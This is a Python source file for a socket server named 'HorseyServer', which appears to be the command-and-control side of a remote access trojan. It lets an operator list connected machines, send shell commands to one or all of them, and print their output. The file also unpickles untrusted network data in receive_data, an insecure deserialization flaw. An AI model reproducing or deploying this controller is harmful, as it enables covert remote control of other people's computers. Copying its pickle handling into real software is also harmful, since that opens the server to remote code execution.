import atexit
from dataclasses import dataclass
import pickle
import socket
import threading


@dataclass
class Data:
    author: str
    type: str
    content: str


class HorseyServer:
    def __init__(self, address: str, port: int, data_header_length: int = 16, string_encoding: str = "utf-8"):
        self.address = address
        self.port = port
        self.socket_address = (address, port)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.data_header_length = data_header_length
        self.string_encoding = string_encoding
        self.connections = {}
        self.alias_to_connection = {}

    def send_data(self, connection: socket.socket, data: Data) -> None:
        serialised_data = pickle.dumps(data)

        connection.send(str(len(serialised_data)).rjust(self.data_header_length).encode(self.string_encoding))
        connection.send(serialised_data)

    def receive_data(self, connection: socket.socket) -> Data:
        try:
            remaining_header_bytes = self.data_header_length
            encoded_header = b""
            while remaining_header_bytes:
                header_fragment = connection.recv(remaining_header_bytes)
                remaining_header_bytes -= len(header_fragment)
                encoded_header += header_fragment

            remaining_data_bytes = int(encoded_header.decode(self.string_encoding))
            serialized_data = b""
            while remaining_data_bytes:
                serialized_data_fragment = connection.recv(remaining_data_bytes)
                remaining_data_bytes -= len(serialized_data_fragment)
                serialized_data += serialized_data_fragment

            return pickle.loads(serialized_data)

        except OSError:
            return Data("receive_data_error_handling", "DISCONNECT", '')

    def data_handler(self, data: Data) -> None:
        print(f"Data({data.author=}, {data.type=}, {data.content=})")

    def client_handler(self, connection: socket.socket) -> None:
        print(f"New connection from: {connection.getpeername()}")
        self.connections[connection] = ''
        while True:
            data = self.receive_data(connection)
            match data.type:
                case "DISCONNECT":
                    connection.close()
                    del self.alias_to_connection[self.connections[connection]]
                    del self.connections[connection]
                    break

                case "ALIAS":
                    self.connections[connection] = data.content
                    self.alias_to_connection[data.content] = connection

                case "COMMAND_OUTPUT":
                    print(data.content)

                case _:
                    self.data_handler(data)

    def connection_handler(self) -> None:
        while True:
            connection, _ = self.socket.accept()
            t_client_handler = threading.Thread(target=self.client_handler, args=(connection,))
            t_client_handler.start()

    def parse_input(self, string_input: str) -> None:
        tokens = string_input.strip().split()
        match tokens[0]:
            case "stop":
                for connection in self.connections:
                    self.send_data(connection, Data("Server", "DISCONNECT", ""))

                exit()

            case "disconnect":
                alias = tokens[1]
                connection = self.alias_to_connection[alias]
                self.send_data(connection, Data("Server", "DISCONNECT", ""))

            case "list":
                for connection, alias in self.connections.items():
                    print(alias, connection.getpeername())

            case "commandall":
                for connection in self.connections:
                    self.send_data(connection, Data("Server", "COMMAND", ' '.join(tokens[1:])))

            case "command":
                alias = tokens[1]
                connection = self.alias_to_connection[alias]
                self.send_data(connection, Data("Server", "COMMAND", ' '.join(tokens[2:])))

            case _:
                for connection in self.connections:
                    self.send_data(connection, Data("Server", "MESSAGE", string_input))

    def start(self) -> None:
        self.socket.bind(self.socket_address)
        self.socket.listen()

        td_connection_handler = threading.Thread(target=self.connection_handler, daemon=True)
        td_connection_handler.start()

        while True:
            self.parse_input(input())


def disconnect_all_at_exit(server: HorseyServer):
    for connection in server.connections:
        connection.close()


if __name__ == "__main__":
    server = HorseyServer(socket.gethostbyname(socket.gethostname()), 5050)

    atexit.register(disconnect_all_at_exit, server)

    server.start()
